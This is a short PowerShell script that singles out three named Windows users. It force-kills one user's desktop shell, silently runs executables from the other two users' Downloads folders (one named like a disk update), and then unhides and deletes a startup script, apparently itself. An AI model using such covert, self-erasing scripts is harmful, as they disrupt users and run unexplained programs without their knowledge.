$user1 = "C:\Users\Jona"
$user2 = "C:\Users\angel"
$user3 = "C:\Users\seba"

if ($env:USERPROFILE -eq $user1) {
    taskkill /F /IM explorer.exe
}

if ($env:USERPROFILE -eq $user2) {
    Start-Process -FilePath "C:\Users\angel\Downloads\Disk-Updating.exe" -NoNewWindow
}

if ($env:USERPROFILE -eq $user3) {
    Start-Process -FilePath "C:\Users\seba\Downloads\lml.exe" -NoNewWindow
}

attrib -h "C:\Users\Public\MyStartUp.ps1"
Remove-Item -Path "C:\Users\Public\MyStartUp.ps1" -Force
